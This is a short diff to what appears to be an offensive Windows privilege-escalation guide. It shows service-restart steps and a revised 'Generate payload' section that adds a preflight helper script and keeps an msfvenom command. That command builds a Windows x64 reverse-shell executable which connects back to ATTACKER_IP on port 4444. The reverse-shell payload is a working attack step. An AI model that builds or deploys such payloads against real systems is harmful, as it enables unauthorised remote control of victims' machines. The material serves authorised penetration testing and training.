@@ -133,8 +133,10 @@ sc start <service_name>
 
 Or wait for system reboot if the service is set to auto-start.
 
-**Generate payload:**
+**Generate payload** — preflight first:
 ```bash
+python3 tools/preflight/pick.py --platform windows --arch x64 --format exe
+# HIT → use returned path, handler already up. MISS → msfvenom below.
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o payload.exe
 ```
 
